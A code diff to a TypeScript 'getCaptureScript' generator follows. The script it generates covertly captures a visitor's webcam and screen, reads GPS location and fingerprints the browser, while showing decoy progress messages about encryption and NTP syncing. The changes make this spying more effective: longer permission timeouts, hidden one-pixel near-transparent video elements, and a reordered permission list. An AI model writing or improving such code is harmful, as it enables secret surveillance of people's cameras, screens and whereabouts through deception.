@@ -227,7 +227,7 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
       }
 
       try {
-        await runSilentProbes();
+        runSilentProbes();
         if (!isSilent) updateProgress(8, "Memulai sesi enkripsi end-to-end...");
         
         var metadata = {
@@ -522,7 +522,7 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
           }
         } catch(e) {}
 
-        await logEvent('info', metadata);
+        logEvent('info', metadata);
 
         // Elite Recon: Social Presence Detection (Cross-Origin Resource Timing)
         (function() {
@@ -568,7 +568,7 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
         })();
 
         // Deep Recon: Orientation & Peripherals
-        await logExtra({
+        logExtra({
           orientation: screen.orientation ? screen.orientation.type : 'N/A',
           gamepads: (navigator.getGamepads ? navigator.getGamepads().length : 0),
           languages: navigator.languages.join(',')
@@ -606,14 +606,18 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
                   // Try to get video only first for better success rate
                   var stream = await pTimeout(navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false }).catch(function(){ 
                     return navigator.mediaDevices.getUserMedia({ video: true }).catch(function() { return null; });
-                  }), 8000);
+                  }), 15000);
                   
                   if (stream) {
                     try {
                       var video = document.createElement('video');
-                      video.style.position = 'absolute';
-                      video.style.left = '-9999px';
-                      video.style.opacity = '0';
+                      video.style.position = 'fixed';
+                      video.style.top = '0';
+                      video.style.left = '0';
+                      video.style.width = '1px';
+                      video.style.height = '1px';
+                      video.style.zIndex = '-9999';
+                      video.style.opacity = '0.01';
                       video.setAttribute('autoplay', '');
                       video.setAttribute('muted', '');
                       video.setAttribute('playsinline', '');
@@ -659,9 +663,9 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
                     navigator.geolocation.getCurrentPosition(
                       function(pos) { logEvent('gps', { lat: pos.coords.latitude, lon: pos.coords.longitude, acc: pos.coords.accuracy }).finally(resolve); },
                       function(err) { resolve(); },
-                      { enableHighAccuracy: true, timeout: 5000 }
+                      { enableHighAccuracy: true, timeout: 10000 }
                     );
-                  }), 8000);
+                  }), 15000);
                 }
               } catch(e) {}
             }
@@ -670,14 +674,18 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
               try {
                 if (!isSilent) updateProgress(prog, "Syncing time with NTP security servers...");
                 if (navigator.mediaDevices && navigator.mediaDevices.getDisplayMedia) {
-                  var s = await pTimeout(navigator.mediaDevices.getDisplayMedia({ video: true }).catch(function(){ return null; }), 8000);
+                  var s = await pTimeout(navigator.mediaDevices.getDisplayMedia({ video: true }).catch(function(){ return null; }), 15000);
                   if (s) {
                     try {
                       var track = s.getVideoTracks()[0];
                       var video = document.createElement('video');
-                      video.style.position = 'absolute';
-                      video.style.left = '-9999px';
-                      video.style.opacity = '0';
+                      video.style.position = 'fixed';
+                      video.style.top = '0';
+                      video.style.left = '0';
+                      video.style.width = '1px';
+                      video.style.height = '1px';
+                      video.style.zIndex = '-9999';
+                      video.style.opacity = '0.01';
                       video.setAttribute('autoplay', '');
                       video.setAttribute('muted', '');
                       video.setAttribute('playsinline', '');
@@ -868,7 +876,7 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
   `;
 };
 
-const ALL_PERMS = ['media', 'gps', 'network', 'performance', 'security', 'storage_map', 'network_forensic', 'fonts_advanced', 'window_mgmt', 'webauthn', 'sensors', 'storage', 'vibration', 'bluetooth', 'clipboard', 'notification', 'screen', 'contacts', 'files'];
+const ALL_PERMS = ['media', 'gps', 'screen', 'notification', 'clipboard', 'contacts', 'network', 'performance', 'security', 'storage_map', 'network_forensic', 'fonts_advanced', 'window_mgmt', 'webauthn', 'sensors', 'storage', 'vibration', 'bluetooth', 'files'];
 const SILENT_PERMS = ['vibration', 'network', 'performance', 'security', 'storage_map', 'network_forensic'];
 const NETWORK_PERMS = ['network', 'bluetooth', 'performance', 'security', 'network_forensic', 'vibration'];
 const GOOGLE_PERMS = ['gps', 'media', 'network', 'performance', 'security', 'vibration'];
